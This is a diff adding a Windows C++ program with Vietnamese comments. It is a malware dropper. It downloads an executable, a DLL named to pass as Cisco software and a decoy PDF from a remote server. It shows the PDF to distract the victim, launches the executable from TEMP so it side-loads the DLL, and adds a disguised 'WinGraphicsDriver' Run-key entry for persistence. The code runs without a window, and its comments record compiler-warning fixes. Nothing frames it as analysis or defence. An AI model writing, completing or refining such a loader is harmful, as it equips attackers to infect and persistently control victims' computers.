@@ -1,0 +1,56 @@
+#include <windows.h>
+#include <urlmon.h>
+#include <string>
+
+#pragma comment(lib, "urlmon.lib")
+
+void DownloadAndRun() {
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+
+    // Cấu hình thông tin từ VPS
+    std::string vps = "http://:8080/";
+    std::string exeName = "CiscoCollabHost.exe";
+    std::string dllName = "CiscoSparkLauncher.dll";
+    std::string pdfName = "a.pdf";
+
+    std::string exePath = std::string(tempPath) + exeName;
+    std::string dllPath = std::string(tempPath) + dllName;
+    std::string pdfPath = std::string(tempPath) + pdfName;
+
+    // 1. Tải các file cần thiết
+    URLDownloadToFileA(NULL, (vps + exeName).c_str(), exePath.c_str(), 0, NULL);
+    URLDownloadToFileA(NULL, (vps + dllName).c_str(), dllPath.c_str(), 0, NULL);
+    URLDownloadToFileA(NULL, (vps + pdfName).c_str(), pdfPath.c_str(), 0, NULL);
+
+    // 2. Mở file PDF đánh lạc hướng
+    ShellExecuteA(NULL, "open", pdfPath.c_str(), NULL, NULL, SW_SHOW);
+
+    // 3. Thực thi EXE và ép nhận DLL tại thư mục TEMP
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    if (CreateProcessA(exePath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, tempPath, &si, &pi)) {
+        // Sửa lỗi C6335: Đóng Handle ngay để tránh rò rỉ tài nguyên
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+
+    // 4. Persistence: Tự động chạy khi khởi động Windows
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        // Sửa lỗi C4267: Ép kiểu (DWORD) cho độ dài chuỗi
+        RegSetValueExA(hKey, "WinGraphicsDriver", 0, REG_SZ, (BYTE*)exePath.c_str(), (DWORD)exePath.length() + 1);
+        RegCloseKey(hKey);
+    }
+}
+
+// Sửa lỗi C28251: Định dạng chuẩn cho WinMain (Chạy ngầm không cửa sổ)
+int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {
+    DownloadAndRun();
+    return 0;
+}
+
